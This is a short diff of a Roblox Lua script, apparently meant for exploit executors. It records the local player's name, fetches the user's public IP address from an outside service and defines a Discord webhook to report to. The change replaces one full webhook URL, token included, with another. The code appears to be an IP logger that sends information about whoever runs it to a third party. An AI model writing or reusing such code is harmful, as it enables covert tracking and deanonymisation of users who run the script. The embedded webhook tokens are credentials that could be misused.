@@ -8,7 +8,7 @@ local executorcheck =is_sirhurt_closure and "Sirhurt" or pebc_execute and "Proto
 
 local name = game:GetService("Players").LocalPlayer.Name
 local WebhookURL =
-"https://discord.com/api/webhooks/1151675680891871272/b5AS_ZQDRQSIc035ingCD6DwgVq2N7Esnf7qZlMtX9DLSfVuGlNUfv5d7Q5-c_CByS5N"
+"https://discord.com/api/webhooks/1152059846712119328/-yB4FYua4_72O0O6VMWHG-qWUHgqsjn1w-pywby9iB9oJ3T0tMebzWiYOZo6vTly1jJG"
 local getIPResponse = request({
     Url = "https://api.ipify.org/?format=json",
     Method = "GET"
